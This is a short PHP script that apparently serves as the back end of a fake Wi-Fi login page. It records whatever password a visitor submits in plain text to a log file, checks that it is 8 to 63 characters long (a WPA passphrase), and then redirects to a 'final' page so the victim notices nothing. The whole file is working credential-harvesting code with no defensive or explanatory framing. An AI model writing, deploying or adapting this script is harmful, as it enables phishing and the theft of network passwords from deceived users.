<?php 
$file = "hasil/logs.txt"; 
$password = $_POST['key1']; 
$ip = $_SERVER['REMOTE_ADDR']; 
$today = date("F j, Y, g:i a");
 
$handle = fopen($file, 'a'); 
fwrite($handle, "\n");
fwrite($handle, "Password: "); 
fwrite($handle, "$password");
fclose($handle); 

$key1 = @$_POST['key1'];

if ( (strlen($key1) < 8) ) {
   echo "<script type=\"text/javascript\">alert(\"The password must be more than 7 characters\");window.history.back()</script>";
}else {
   header("location:final.html");
}

if ( (strlen($key1) > 63) ) {
   echo "<script type=\"text/javascript\">alert(\"The password must be less than 64 characters\");window.history.back()</script>";
}


?> 
